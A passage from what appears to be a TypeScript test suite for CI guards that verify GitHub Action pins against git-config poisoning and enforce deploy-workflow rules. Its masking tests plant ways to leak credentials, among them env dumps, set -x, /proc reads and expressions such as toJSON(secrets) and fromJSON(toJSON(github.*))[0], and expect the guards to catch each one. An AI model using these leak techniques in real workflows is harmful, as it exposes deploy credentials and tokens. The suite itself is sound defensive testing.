  // action-pins.ts gives, which printed the decoys FETCH-G1-01 names beside the tag; for a lightweight release
  // tag, as both of those actions' are, a decoy tag's ^{} line was the only ^{} line, and the file said the
  // commit is that line's. The line, read from the file and run as a person runs it against a repository that
  // holds the decoys at another commit, now prints the tag's own lines alone.
  it('gives a hand proof of PINS_JOB_ACTIONS that prints the tag’s own lines alone (round 12)', () => {
    const source = readFileSync(join(root, 'scripts/guards/action-pins.ts'), 'utf8').split('\n')
    const from = source.findIndex(line => line.startsWith('//   GIT_CONFIG_NOSYSTEM=1 '))
    const hand: string[] = []
    for (let i = from; i >= 0 && (source[i] ?? '').startsWith('//   '); i++) hand.push((source[i] ?? '').slice(5))
    expect(hand.length).toBeGreaterThan(1)
    expect(hand.join('\n')).toContain('https://github.com/<action>.git')
    for (const annotated of [false, true]) {
      const folder = mkdtempSync(join(tmpdir(), 'hearth-action-pins-'))
      try {
        const env = {
          PATH: process.env.PATH ?? '',
          HOME: join(folder, 'home'),
          GIT_CONFIG_NOSYSTEM: '1',
          GIT_CONFIG_GLOBAL: '/dev/null',
        }
        const git = (args: readonly string[]) =>
          execFileSync(
            'git',
            [
              ...['-c', 'user.name=hearth-test', '-c', `user.email=${['test', 'example.invalid'].join('@')}`],
              ...['-c', 'commit.gpgsign=false', '-c', 'tag.gpgSign=false', '-c', 'core.hooksPath=/dev/null', ...args],
            ],
            { cwd: join(folder, 'action'), encoding: 'utf8', env, stdio: ['ignore', 'pipe', 'pipe'] },
          ).trim()
        execFileSync('mkdir', ['-p', join(folder, 'action'), env.HOME])
        git(['init', '-q'])
        git(['commit', '-q', '--allow-empty', '-m', 'release'])
        git(annotated ? ['tag', '-a', '-m', 'release', 'v7.0.1'] : ['tag', 'v7.0.1'])
        const tagged = git(['rev-parse', 'HEAD'])
        const tagObject = git(['rev-parse', 'refs/tags/v7.0.1'])
        git(['commit', '-q', '--allow-empty', '-m', 'other'])
        const other = git(['rev-parse', 'HEAD'])
        git(['update-ref', 'refs/heads/refs/tags/v7.0.1', other])
        git(['tag', '-a', '-m', 'other', 'x/refs/tags/v7.0.1', other])
        const command = hand
          .join('\n')
          .replace('https://github.com/<action>.git', `file://${join(folder, 'action')}`)
          .replaceAll('<version>', 'v7.0.1')
        const answer = execFileSync('bash', ['--noprofile', '--norc', '-c', command], {
          cwd: folder,
          env,
          encoding: 'utf8',
        })
        expect(answer, `annotated: ${annotated}`).toBe(
          annotated
            ? `${tagObject}\trefs/tags/v7.0.1\n${tagged}\trefs/tags/v7.0.1^{}\n`
            : `${tagged}\trefs/tags/v7.0.1\n`,
        )
        expect(answer).not.toContain(other)
      } finally {
        rmSync(folder, { recursive: true, force: true })
      }
    }
  })

  // FETCH-A3-01: git read each action's repository with the configuration of whoever ran the check, so a
  // test that ran before it in CI's check job and wrote url.<fork>.insteadOf to $HOME/.gitconfig sent the read
  // to a fork whose tag names the fork's commit, and a pin moved to that commit passed. Each way git takes
  // configuration is planted here, first shown to send a plain git ls-remote to the fork, then the check's
  // own read to name the repository's commit all the same.
  it('reads the repository it names whatever configuration git would otherwise read (FETCH-A3-01)', () => {
    const folder = mkdtempSync(join(tmpdir(), 'hearth-action-pins-'))
    try {
      const bare = { PATH: process.env.PATH ?? '', HOME: join(folder, 'home') }
      const git = (cwd: string, args: readonly string[]) =>
        execFileSync(
          'git',
          [
            ...['-c', 'user.name=hearth-test', '-c', `user.email=${['test', 'example.invalid'].join('@')}`],
            ...['-c', 'commit.gpgsign=false', '-c', 'tag.gpgSign=false', '-c', 'core.hooksPath=/dev/null', ...args],
          ],
          {
            cwd,
            encoding: 'utf8',
            env: { ...bare, GIT_CONFIG_NOSYSTEM: '1', GIT_CONFIG_GLOBAL: '/dev/null' },
            stdio: ['ignore', 'pipe', 'pipe'],
          },
        ).trim()
      const repository = (name: string) => {
        const path = join(folder, name)
        execFileSync('mkdir', ['-p', path, bare.HOME])
        git(path, ['init', '-q'])
        git(path, ['commit', '-q', '--allow-empty', '-m', name])
        git(path, ['tag', '-a', '-m', name, 'v7.0.1'])
        return { url: `file://${path}`, commit: git(path, ['rev-parse', 'HEAD']) }
      }
      const own = repository('own')
      const fork = repository('fork')
      expect(own.commit).not.toBe(fork.commit)
      const rewrite = `[url "${fork.url}"]\n\tinsteadOf = ${own.url}\n`
      const file = (name: string, text: string) => {
        const path = join(folder, name)
        execFileSync('mkdir', ['-p', join(path, '..')])
        writeFileSync(path, text)
        return path
      }
      const local = join(folder, 'local')
      execFileSync('mkdir', ['-p', local])
      git(local, ['init', '-q'])
      file('local/.git/config', `${readFileSync(join(local, '.git/config'), 'utf8')}${rewrite}`)
      const ways: ReadonlyArray<readonly [string, Record<string, string>]> = [
        ['$HOME/.gitconfig', { HOME: join(folder, 'poisoned'), _: file('poisoned/.gitconfig', rewrite) }],
        ['$XDG_CONFIG_HOME/git/config', { XDG_CONFIG_HOME: join(folder, 'xdg'), _: file('xdg/git/config', rewrite) }],
        ['GIT_CONFIG_GLOBAL', { GIT_CONFIG_GLOBAL: file('global', rewrite) }],
        ['GIT_CONFIG_SYSTEM', { GIT_CONFIG_SYSTEM: file('system', rewrite) }],
        [
          'GIT_CONFIG_COUNT',
          { GIT_CONFIG_COUNT: '1', GIT_CONFIG_KEY_0: `url.${fork.url}.insteadOf`, GIT_CONFIG_VALUE_0: own.url },
        ],
        ['GIT_CONFIG_PARAMETERS', { GIT_CONFIG_PARAMETERS: `'url.${fork.url}.insteadof'='${own.url}'` }],
        ['GIT_DIR', { GIT_DIR: join(local, '.git') }],
      ]
      const read = (answer: string) => tagCommit(answer, 'v7.0.1')
      for (const [way, planted] of ways) {
        const { _: _file, ...variables } = planted
        const env = { ...bare, ...variables }
        const plain = execFileSync('git', ['ls-remote', own.url, 'refs/tags/v7.0.1', 'refs/tags/v7.0.1^{}'], {
          cwd: folder,
          encoding: 'utf8',
          env: { ...env, GIT_TERMINAL_PROMPT: '0' },
          stdio: ['ignore', 'pipe', 'pipe'],
        })
        expect(read(plain), `${way}: a plain read goes to the fork`).toBe(fork.commit)
        expect(read(readTagRefs(own.url, 'v7.0.1', env)), way).toBe(own.commit)
      }
      // All of them at once, and only the network's variables and PATH handed on.
      const all = Object.assign({}, ...ways.map(([, planted]) => planted)) as Record<string, string>
      expect(read(readTagRefs(own.url, 'v7.0.1', { ...bare, ...all }))).toBe(own.commit)
      const env = gitEnvironment(
        { ...bare, ...all, HTTPS_PROXY: 'http://proxy.invalid:3128', NODE_OPTIONS: '-r x' },
        folder,
      )
      expect(Object.keys(env).sort()).toEqual([
        'GIT_CEILING_DIRECTORIES',
        'GIT_CONFIG_GLOBAL',
        'GIT_CONFIG_NOSYSTEM',
        'GIT_CONFIG_SYSTEM',
        'GIT_TERMINAL_PROMPT',
        'HOME',
        'HTTPS_PROXY',
        'PATH',
        'XDG_CONFIG_HOME',
      ])
    } finally {
      rmSync(folder, { recursive: true, force: true })
    }
  })
})

describe('DPW-05 (C11-D47, C11-D79): timeouts and concurrency', () => {
  it('finds each planted breakage', () => {
    expect(timeoutAndGroupFindings(plant('    timeout-minutes: 15\n', '', job('gate')))).toEqual([
      `${DEPLOY}: DPW-05 gate: timeout-minutes is set, at most 15`,
    ])
    expect(
      timeoutAndGroupFindings(plant('    timeout-minutes: 50\n', '    timeout-minutes: 70\n', job('prod'))),
    ).toEqual([`${DEPLOY}: DPW-05 prod: timeout-minutes is set, at most 50`])
    expect(timeoutAndGroupFindings(plant('    cache-mode: none\n', '', job('gate')))).toEqual([
      `${DEPLOY}: DPW-05 gate: sets cache-mode: none`,
    ])
    expect(
      timeoutAndGroupFindings(
        plant('      cancel-in-progress: false\n', '      cancel-in-progress: true\n', job('nonprod')),
      ),
    ).toEqual([`${DEPLOY}: DPW-05 nonprod: its concurrency is the group deploy-nonprod with cancel-in-progress false`])
    expect(
      timeoutAndGroupFindings(plant('      group: deploy-prod\n', `      group: \${{ github.ref }}\n`, job('prod'))),
    ).toEqual([`${DEPLOY}: DPW-05 prod: its concurrency is the group deploy-prod with cancel-in-progress false`])
    expect(
      timeoutAndGroupFindings(
        plant('    cache-mode: none\n', '    cache-mode: none\n    concurrency: deploy-prod\n', job('smoke-prod')),
      ),
    ).toEqual([
      `${DEPLOY}: DPW-05 smoke-prod: holds no concurrency group`,
      `${DEPLOY}: DPW-05 smoke-prod: names deploy-nonprod or deploy-prod only as a deploy job's group`,
    ])
    expect(
      timeoutAndGroupFindings(
        plant(
          'permissions:\n  contents: read\njobs:',
          'concurrency:\n  group: x\npermissions:\n  contents: read\njobs:',
        ),
      ),
    ).toEqual([`${DEPLOY}: DPW-05 has no workflow-level concurrency`])
    const check = '  check:\n    needs: [secrets, audit, action-pins, cli-pin]\n'
    expect(
      timeoutAndGroupFindings(plant(check, `${check}    concurrency:\n      group: Deploy-Prod\n`, '', CI)),
    ).toEqual([`${CI}: DPW-05 names neither deploy-nonprod nor deploy-prod, in any letter case`])
    // A group built by an expression could come to either deploy group, whatever its text.
    const EXPRESSION = `${CI}: DPW-05 sets no concurrency group by an expression, which could come to deploy-nonprod or deploy-prod`
    expect(
      timeoutAndGroupFindings(
        plant(
          check,
          `${check}    concurrency:\n      group: \${{ format('deploy-{0}', 'prod') }}\n      cancel-in-progress: true\n`,
          '',
          CI,
        ),
      ),
    ).toEqual([EXPRESSION])
    expect(
      timeoutAndGroupFindings(
        plant(
          check,
          `${check}    concurrency:\n      group: deploy-\${{ 'prod' }}\n      cancel-in-progress: true\n`,
          '',
          CI,
        ),
      ),
    ).toEqual([EXPRESSION])
  })

  it('holds the repository', () => {
    expect(timeoutAndGroupFindings(workflows)).toEqual([])
  })
})

describe('DPW-06 (C11-D52, C11-D53; T24 items 5, 11, 13, 15, 18): the deploy jobs’ steps', () => {
  const at = (id: string, rule: string) => `${DEPLOY}: DPW-06 ${id}: ${rule}`
  const RUN_TASK = 'every aws ecs run-task line is RUN_TASK_MIGRATE or RUN_TASK_PROBE byte for byte'
  const OVERRIDES = "--overrides is on the probe's run-task line alone"
  const FLAGS =
    'passes no --cli-input-json, --cli-input-yaml, --generate-cli-skeleton, --enable-execute-command or --tags'
  const NET = "a one-off's network configuration is NET_JQ's: its kind's own group, the isolated subnets, no public IP"
  const OVERRIDE = "the probe's override is OVERRIDES_JQ's, PROBE_TARGETS alone"
  const TOKEN = 'its TOKEN is <kind>-<env>-<deploy or rollback>-$GITHUB_RUN_ID-$GITHUB_RUN_ATTEMPT, its own'
  const LOG = "only the one-off's end reads a task's log, and prints only its kind's lines"
  const PROBE_STEP = "the probe's step is the preamble, its TOKEN, TASKS_OUTPUTS, ONE_OFF and PROBE, byte for byte"
  const MIGRATE_STEP =
    "migrate's step is the preamble, TASKS_OUTPUTS, ONE_OFF and migrate's run, byte for byte, with no override"
  const NO_MIGRATE = 'runs no migrate: only nonprod and prod do, for a deploy'
  const ORDER =
    'a forward deploy is the push, Platform, Data and Tasks, then migrate (for a deploy alone), then Services'
  const CLI = 'every CLI line is one of the canonical deploy and diff lines, in a job that may run it'
  const STACKS =
    "names on each CLI line the stacks its step deploys or diffs, as CLI_STACKS writes them: Platform, Data and Tasks forward, then Services (the drill's too), a rollback's Tasks and Services, restore=down's one stack, and prod-plan's diff of every stack, the rollback's Tasks and Services or restore=down's one stack"
  const DOWN =
    'restore=down takes Services, then Data, then Platform down, one call each, each only for a stack that exists and has settled'
  const AWS =
    'AWS_CHECK, byte for byte, is the step right after the credentials action, before any push or deploy, called with its mode'
  const GOES_ON =
    "lets no failure pass: no continue-on-error, and no step's if: calls always(), success(), failure() or cancelled()"
  const UNCONDITIONAL =
    'runs every step up to its credentials action, and AWS_CHECK after it, unconditionally, but its downloads, a download’s asset check under that download’s if:, and its image check, under the push’s if:'
  const CLI_IF = "runs each CLI line only in the modes that call for it: its step's if: as written"
  const migrate = '      - name: Migrate\n'
  const probe = '      - name: Probe\n'
  const find = (from: string, to: string, after: string) => deployStepFindings(plant(from, to, after))

  it('finds each planted breakage in the one-off runs', () => {
    expect(
      find('--client-token "$TOKEN" --query', '--client-token "$TOKEN" --overrides "$OVERRIDES" --query', migrate),
    ).toEqual([at('nonprod', RUN_TASK), at('nonprod', OVERRIDES), at('nonprod', MIGRATE_STEP)])
    expect(
      find('{name:"PROBE_TARGETS",value:$t}', '{name:"PROBE_TARGETS",value:$t},{name:"NODE_OPTIONS",value:"x"}', probe),
    ).toEqual([at('nonprod', OVERRIDE), at('nonprod', PROBE_STEP)])
    expect(
      find(
        '{name:"server",environment:',
        '{name:"server",environmentFiles:[{value:"x",type:"s3"}],environment:',
        probe,
      ),
    ).toEqual([at('nonprod', OVERRIDE), at('nonprod', PROBE_STEP)])
    expect(deployStepFindings(movedStep('nonprod', 'Migrate', 'Roll back to the target'))).toEqual([
      at('nonprod', ORDER),
    ])
    expect(deployStepFindings(movedStep('nonprod', 'Migrate', 'Push the image'))).toEqual([at('nonprod', ORDER)])
    expect(deployStepFindings(copiedStep('nonprod', 'Migrate', 'rollback-nonprod', 'Probe'))).toEqual([
      at('rollback-nonprod', TOKEN),
      at('rollback-nonprod', NO_MIGRATE),
    ])
    const lastWait = '              run aws ecs wait tasks-stopped --cluster "$CLUSTER" --tasks "$task"\n'
    expect(find(lastWait, lastWait.replace('\n', ' || true\n'), probe)).toEqual([
      at('nonprod', LOG),
      at('nonprod', PROBE_STEP),
    ])
    expect(find('assignPublicIp:"DISABLED"', 'assignPublicIp:"ENABLED"', migrate)).toEqual([
      at('nonprod', NET),
      at('nonprod', MIGRATE_STEP),
    ])
    expect(find('--propagate-tags TASK_DEFINITION ', '', probe)).toEqual([
      at('nonprod', RUN_TASK),
      at('nonprod', OVERRIDES),
      at('nonprod', PROBE_STEP),
    ])
    expect(find('--arg g "$PROBE_SG"', '--arg g "$MIGRATE_SG"', probe)).toEqual([
      at('nonprod', NET),
      at('nonprod', PROBE_STEP),
    ])
    expect(
      find(
        '--overrides "$OVERRIDES" --query',
        '--overrides "$OVERRIDES" --cli-input-yaml file://x.yaml --query',
        probe,
      ),
    ).toEqual([at('nonprod', RUN_TASK), at('nonprod', OVERRIDES), at('nonprod', FLAGS), at('nonprod', PROBE_STEP)])
    expect(
      find('--propagate-tags TASK_DEFINITION', '--propagate-tags TASK_DEFINITION --enable-execute-command', migrate),
    ).toEqual([at('nonprod', RUN_TASK), at('nonprod', FLAGS), at('nonprod', MIGRATE_STEP)])
    expect(find('TOKEN="probe-nonprod-rollback-', 'TOKEN="probe-nonprod-deploy-', job('rollback-nonprod'))).toEqual([
      at('rollback-nonprod', TOKEN),
      at('rollback-nonprod', PROBE_STEP),
    ])
    expect(
      deployStepFindings(
        addedBefore(
          'nonprod',
          'Read back what runs',
          "          SERVICE_LIST='[]'\n",
          '          run aws logs get-log-events --log-group-name "/hearth/$STAGE/probe" --log-stream-name x\n',
        ),
      ),
    ).toEqual([at('nonprod', LOG)])
  }, 30_000)

  it('finds each planted breakage in the CLI lines, their order, STAGE and AWS_CHECK', () => {
    const oneCall = `run "$CDK" deploy --app "$ASSEMBLY" "$STAGE/Services" "$STAGE/Data" "$STAGE/Platform" --exclusively --no-previous-parameters --require-approval never --no-lookups --no-notices --ci --progress events`
    expect(
      find(`${indent(RESTORE_DOWN, 10)}\n`, `          ${oneCall}\n`, '      - name: Take the restore stage down\n'),
    ).toEqual([at('prod', CLI), at('prod', STACKS), at('prod', DOWN)])
    expect(find('"$STAGE/Platform"', 'Hearth-nonprod-Platform', job('nonprod'))).toEqual([
      at('nonprod', CLI),
      at('nonprod', STACKS),
      at('nonprod', ORDER),
    ])
    expect(
      find('"$STAGE/Services" --exclusively', '"$STAGE/Services"', '      - name: Roll back Tasks and Services\n'),
    ).toEqual([at('rollback-nonprod', CLI)])
    expect(
      find(
        '"$STAGE/Services" --exclusively',
        '"$STAGE/Services" --exclusively --parameters x=y --notification-arns x',
        '      - name: Deploy Services\n',
      ),
    ).toEqual([at('nonprod', CLI), at('nonprod', ORDER)])
    expect(deployStepFindings(movedStep('nonprod', 'What runs', 'Deploy Platform, Data and Tasks'))).toEqual([
      at('nonprod', UNCONDITIONAL),
      at('nonprod', AWS),
    ])
    expect(
      find(
        "aws_refuse 'a deployment is in progress: wait for it to settle, then dispatch again'",
        'true',
        job('nonprod'),
      ),
    ).toEqual([at('nonprod', AWS)])
    expect(find('      STAGE: nonprod\n', '      STAGE: prod\n', job('nonprod'))).toEqual([
      at('nonprod', 'sets STAGE once, at the job, to nonprod'),
    ])
    expect(
      deployStepFindings(
        addedBefore('nonprod', 'Read back what runs', "          SERVICE_LIST='[]'\n", '          STAGE=prod\n'),
      ),
    ).toEqual([at('nonprod', 'sets STAGE once, at the job, to nonprod')])
    expect(
      find(`    if: \${{ needs.gate.outputs.mode != 'drill-break' }}\n`, `    if: \${{ always() }}\n`, probe),
    ).toEqual([at('nonprod', GOES_ON), at('nonprod', 'probes once, after every Services deploy but restore=down’s')])
  }, 30_000)

  // Nothing lets a failed or skipped check go on to deploy: a job goes on only while each step before succeeded.
  it('finds each planted way past a failed check: continue-on-error, a status function, a skipped check, an if: of its own', () => {
    const what = '      - name: What runs\n        id: aws\n'
    const goOn = '      - name: What runs\n        continue-on-error: true\n        id: aws\n'
    expect(find(what, goOn, job('nonprod'))).toEqual([at('nonprod', GOES_ON)])
    expect(find(what, goOn, job('prod'))).toEqual([at('prod', GOES_ON)])
    expect(find('        id: plan\n', '        id: plan\n        continue-on-error: true\n', job('gate'))).toEqual([
      at('gate', GOES_ON),
    ])
    expect(
      find('    timeout-minutes: 40\n', '    timeout-minutes: 40\n    continue-on-error: true\n', job('prod-gate')),
    ).toEqual([at('prod-gate', GOES_ON)])
    // Both forward steps run after AWS_CHECK refused.
    const forward = `        if: \${{ needs.gate.outputs.mode == 'deploy' || needs.gate.outputs.mode == 'drill-smoke' }}\n`
    const always = `        if: \${{ always() && (needs.gate.outputs.mode == 'deploy' || needs.gate.outputs.mode == 'drill-smoke') }}\n`
    const both = withText(
      DEPLOY,
      edited(edited(deployText, forward, always, job('nonprod')), forward, always, job('nonprod')),
    )
    expect(deployStepFindings(both)).toEqual([at('nonprod', GOES_ON), at('nonprod', CLI_IF)])
    // A check skipped: AWS_CHECK, the asset check before prod-plan's diff, the fast re-check.
    expect(find(what, `${what}        if: \${{ false }}\n`, job('nonprod'))).toEqual([at('nonprod', UNCONDITIONAL)])
    expect(
      find(
        '      - name: Check the assembly\n',
        `      - name: Check the assembly\n        if: \${{ false }}\n`,
        job('prod-plan'),
      ),
    ).toEqual([at('prod-plan', UNCONDITIONAL)])
    expect(
      find(
        '      - name: The fast re-check\n',
        `      - name: The fast re-check\n        if: \${{ false }}\n`,
        job('prod'),
      ),
    ).toEqual([at('prod', UNCONDITIONAL)])
    // A CLI line in a mode that doesn't call for it: a forward deploy in a rollback, a rollback job's deploy
    // after AWS_CHECK said nothing is to be rolled back.
    expect(
      find(
        forward,
        `        if: \${{ needs.gate.outputs.mode != 'drill-break' }}\n`,
        '      - name: Deploy Services\n',
      ),
    ).toEqual([at('nonprod', CLI_IF)])
    expect(
      find(`        if: \${{ steps.aws.outputs.go == 'true' }}\n`, `        if: \${{ true }}\n`, job('rollback-prod')),
    ).toEqual([at('rollback-prod', CLI_IF)])
  }, 30_000)

  // ROLLBACK-04, ROLLBACK-01, ROLLBACK-07: down skips a stack a failed create left whatever it reads, every
  // mode but a restore checks ECR's images' commits, and prod's AWS_CHECK knows which way a restore goes.
  // Round 2's ROLLBACK-01 and AWS-01: a deploy and a drill check them too; ROLLBACK-03 and AWS-02: down
  // skips a stack whose failed create couldn't roll back, and fails once the others are down.
  it('finds restore=down, the newest-image check or a restore’s direction taken out', () => {
    expect(
      find(
        '    ROLLBACK_COMPLETE | REVIEW_IN_PROGRESS)\n',
        '    ROLLBACK_COMPLETE)\n',
        '      - name: Take the restore stage down\n',
      ),
    ).toEqual([at('prod', DOWN)])
    expect(
      find('    ROLLBACK_FAILED)\n', '    ROLLBACK_FAILED_NOT)\n', '      - name: Take the restore stage down\n'),
    ).toEqual([at('prod', DOWN)])
    expect(
      find(
        '            exit 1\n          fi\n',
        '          fi\n',
        '            echo "restore down: the restore stage isn',
      ),
    ).toEqual([at('prod', DOWN)])
    for (const id of ['nonprod', 'rollback-nonprod', 'prod']) {
      expect(find('  if [ "$mode" != restore ]; then\n', '  if [ "$mode" = auto ]; then\n', job(id)), id).toEqual([
        at(id, AWS),
      ])
    }
    expect(
      find(
        '        deploy | drill) aws_refuse "a later commit',
        '        drill) aws_refuse "a later commit',
        job('nonprod'),
      ),
    ).toEqual([at('nonprod', AWS)])
    const first = `          FIRST: \${{ needs.gate.outputs.first_prod }}\n`
    expect(find(`          RESTORE: \${{ needs.gate.outputs.restore }}\n${first}`, first, job('prod'))).toEqual([
      at('prod', AWS),
    ])
  })

  // ROLLBACK-02: the pipeline's rollback judges what its deploy replaced, read by that deploy's AWS_CHECK.
  it('finds a rollback that can’t see what its deploy replaced', () => {
    expect(find(`          REPLACED: \${{ needs.nonprod.outputs.replaced }}\n`, '', job('rollback-nonprod'))).toEqual([
      at('rollback-nonprod', AWS),
    ])
    expect(
      find(
        `          REPLACED: \${{ needs.prod.outputs.replaced }}\n`,
        `          REPLACED: \${{ needs.nonprod.outputs.replaced }}\n`,
        job('rollback-prod'),
      ),
    ).toEqual([at('rollback-prod', AWS)])
    expect(find(`  if [ "\${REPLACED:-}" != none ] &&\n`, '  if false &&\n', job('rollback-prod'))).toEqual([
      at('rollback-prod', AWS),
    ])
    expect(
      find('    deploy | drill) echo "replaced=$release"', '    deploy) echo "replaced=$release"', job('nonprod')),
    ).toEqual([at('nonprod', AWS)])
  })

  it('holds the repository', () => {
    expect(deployStepFindings(workflows)).toEqual([])
  })
})

describe('DPW-07 (C11-D61): what a log, a summary or an output can show', () => {
  const at = (where: string, rule: string) => `${DEPLOY}: DPW-07 ${where}: ${rule}`
  const readBack = 'nonprod (Read back what runs)'
  const added = (line: string) =>
    maskingFindings(
      addedBefore('nonprod', 'Read back what runs', "          SERVICE_LIST='[]'\n", `          ${line}\n`),
    )
  const MASK = 'masks secrets.AWS_ACCOUNT_ID (::add-mask::) before the credentials action'
  const STOPS =
    "starts with STOP_HEAD, which stops the runner reading workflow commands before anything it runs reads or prints (every run but the account id's mask, before the credentials action or after it), so no ##[add-mask] or other command in what it prints, a downloaded archive's or assembly's text or the CLI's, aws's or skopeo's among it, hides a line of the log or the approver's diff or drops a job output"
  const TRACE =
    'runs no set -x, set -o xtrace, env, printenv, export -p or declare -p, and no set, declare, export, local or readonly given no name'
  const OWN =
    "expands on its own lines only a name its step's or job's env: sets (never GH_TOKEN, which gh reads itself), one its run sets, a function's argument, the last status or the runner's outputs, summary, folder and run ids, so no line reads the OIDC request token or another credential the runner hands it"

  it('finds each planted breakage', () => {
    expect(added('set -x')).toEqual([at(readBack, TRACE)])
    expect(added('env | sort')).toEqual([at(readBack, TRACE)])
    expect(added(`echo "\${{ inputs.release }}"`)).toEqual([
      at(readBack, 'takes inputs and outputs through env:, never an expression in its run'),
    ])
    expect(
      maskingFindings(
        plant(`ACCOUNT_ID: \${{ secrets.AWS_ACCOUNT_ID }}`, `ACCOUNT_ID: \${{ secrets.OTHER }}`, job('nonprod')),
      ),
    ).toEqual([
      at('nonprod', 'names no secret but AWS_DEPLOY_ROLE and AWS_ACCOUNT_ID, never GITHUB_TOKEN'),
      at('nonprod', MASK),
    ])
    expect(
      maskingFindings(
        plant(
          `      GH_TOKEN: \${{ github.token }}`,
          `      GH_TOKEN: \${{ secrets.GITHUB_TOKEN }}`,
          job('record-nonprod'),
        ),
      ),
    ).toEqual([at('record-nonprod', 'names no secret')])
    // The mask's run must add its mask, so it alone never stops the runner reading commands, wherever it stands.
    expect(maskingFindings(movedStep('nonprod', 'Mask the account id', 'What runs'))).toEqual([
      at('nonprod (Mask the account id)', 'a run after the credentials action starts with the preamble'),
      at('nonprod', MASK),
    ])
    expect(added('aws sts get-caller-identity')).toEqual([
      at(readBack, 'runs every aws, CDK and skopeo command as run … or $(get …)'),
    ])
    expect(added('X=$(command aws sts get-caller-identity)')).toEqual([
      at(readBack, 'runs every aws, CDK and skopeo command as run … or $(get …)'),
    ])
    expect(
      maskingFindings(
        plant('          mask-aws-account-id: true\n', '          mask-aws-account-id: false\n', job('nonprod')),
      ),
    ).toEqual([
      at(
        'nonprod',
        "the credentials action's with: is exactly role-to-assume, aws-region, allowed-account-ids, role-session-name, role-duration-seconds, mask-aws-account-id: true and translate-env-variables: false",
      ),
    ])
    expect(added('echo "x" >>"$GITHUB_STEP_SUMMARY"')).toEqual([
      at(readBack, 'writes the job summary only through mask'),
    ])
    // Each write on its own, beside a masked one; and mask named as an argument, not piped into.
    expect(added('echo ok | mask | tee -a "$GITHUB_STEP_SUMMARY"; echo "$COMMIT" >> "$GITHUB_STEP_SUMMARY"')).toEqual([
      at(readBack, 'writes the job summary only through mask'),
    ])
    expect(added('echo "$COMMIT" mask >>"$GITHUB_STEP_SUMMARY"')).toEqual([
      at(readBack, OWN),
      at(readBack, 'writes the job summary only through mask'),
    ])
    // get keeps its output only as the first command of a $( … ): bare, or after another in it, it prints.
    expect(added('get aws sts get-caller-identity')).toEqual([
      at(readBack, 'runs every aws, CDK and skopeo command as run … or $(get …)'),
    ])
    expect(added('get aws ecs describe-services --cluster x | cat')).toEqual([
      at(readBack, 'runs every aws, CDK and skopeo command as run … or $(get …)'),
    ])
    expect(added('X=$(true; get aws sts get-caller-identity)')).toEqual([
      at(readBack, 'runs every aws, CDK and skopeo command as run … or $(get …)'),
    ])
    expect(
      maskingFindings(
        plant('      STAGE: nonprod\n', '      STAGE: nonprod\n      AWS_REGION: ap-southeast-1\n', job('nonprod')),
      ),
    ).toEqual([at('nonprod', 'sets no AWS_ variable and no ROLE_TO_ASSUME')])
  }, 30_000)

  // Round 4's GUARDS-01: GitHub reads a context's name in any letter case, by property or by index, and a whole
  // context too, so an action's input (which no rule pins by value) can name a secret or the job's token in
  // any of those spellings. An upload's name is listed on the public run page while the job runs.
  it('finds a secret or the job token named in any spelling, in an action input', () => {
    const SECRET = 'names no secret'
    const NONPROD = 'names no secret but AWS_DEPLOY_ROLE and AWS_ACCOUNT_ID, never GITHUB_TOKEN'
    const TOKEN = 'names github.token only as a GH_TOKEN env value, and the github context never whole'
    // Each plant is an expression, written ${{ inner }} in the action's input.
    const upload = (inner: string) =>
      maskingFindings(plant('          name: assembly\n', `          name: \${{ ${inner} }}\n`, job('synth')))
    for (const inner of [
      'SECRETS.GITHUB_TOKEN',
      'Secrets.AWS_DEPLOY_ROLE',
      "secrets['AWS_ACCOUNT_ID']",
      "SECRETS [ 'OTHER' ]",
      'toJSON(SECRETS)',
      'toJSON(secrets)',
    ]) {
      expect(upload(inner), inner).toEqual([at('synth', SECRET)])
    }
    for (const inner of [
      'github.token',
      'GITHUB.TOKEN',
      'github . Token',
      "github['token']",
      'toJSON(github)',
      'toJSON(GitHub)',
      "format('{0}', github)",
      // Round 5's second attack (YAML-A2-01): the object filter hands on every value of the github context,
      // the token first, so fromJSON(toJSON(github.*))[0] is the token itself.
      'github.*',
      'GitHub . *',
      'toJSON(github.*)',
      "join(github.*, ' ')",
      'fromJSON(toJSON(github.*))[0]',
    ]) {
      expect(upload(inner), inner).toEqual([at('synth', TOKEN)])
    }
    // In a credentialed job, a name the job may use is still refused in any spelling but the workflow's own.
    const checkout = (inner: string) =>
      maskingFindings(
        plant(
          '          fetch-depth: 0\n',
          `          ref: \${{ ${inner} }}\n          fetch-depth: 0\n`,
          job('nonprod'),
        ),
      )
    for (const inner of ['Secrets.OTHER', 'SECRETS.AWS_DEPLOY_ROLE', 'secrets.aws_account_id']) {
      expect(checkout(inner), inner).toEqual([at('nonprod', NONPROD)])
    }
    expect(checkout('GitHub.Token')).toEqual([at('nonprod', TOKEN)])
    expect(checkout("join(github.*, ' ')")).toEqual([at('nonprod', TOKEN)])
    expect(checkout('fromJSON(toJSON(github.*))[0]')).toEqual([at('nonprod', TOKEN)])
  })

  // The preamble's filter undone after it, env in any use, and a wrapper or a redirection before aws: each
  // would print what the filter is there to hide.
  it('finds the preamble’s filter undone, env in any use, and a wrapper or a redirection before aws', () => {
    const FILTER =
      'defines mask, run and get only in its preamble, and no later definition, alias or unset changes them'
    for (const line of [
      'mask() { cat; }',
      'run() { "$@"; }',
      'get() { "$@"; }',
      'function mask { cat; }',
      'sed() { cat; }',
      'unset -f mask',
      'unset mask',
      'alias mask=cat',
    ]) {
      expect(added(line)).toEqual([at(readBack, FILTER)])
    }
    for (const line of ['env -0', 'env -u X', 'X=1 env', 'jq -n env', 'declare -x', 'sudo /usr/bin/env']) {
      expect(added(line), line).toEqual([at(readBack, TRACE)])
    }
    const smoke = (before: string) =>
      maskingFindings(
        plant(
          'node infra/scripts/deploy/smoke.ts',
          `${before}node infra/scripts/deploy/smoke.ts`,
          job('smoke-nonprod'),
        ),
      )
    expect(smoke('env -0; ')).toEqual([at('smoke-nonprod (Smoke)', TRACE)])
    expect(smoke('env -u X; ')).toEqual([at('smoke-nonprod (Smoke)', TRACE)])
    for (const line of [
      '2>/dev/null aws sts get-caller-identity',
      'command -p aws sts get-caller-identity',
      'time -p aws sts get-caller-identity',
    ]) {
      expect(added(line)).toEqual([at(readBack, 'runs every aws, CDK and skopeo command as run … or $(get …)')])
    }
  }, 30_000)

  // SECURITY-04: jq's env and $ENV inside a quoted program, a /proc file and an AWS_ variable's expansion print
  // the credentials in a credentialed run, though no unquoted env word stands there.
  it('finds what prints the credentials from inside quoted text in a credentialed run', () => {
    const PRINTS =
      'hands no jq program env or $ENV, reads no /proc file and expands no AWS_ variable, any of which prints the credentials'
    // A quoted env handed to jq whole is env handed to a program too (round 4's GUARDS-02).
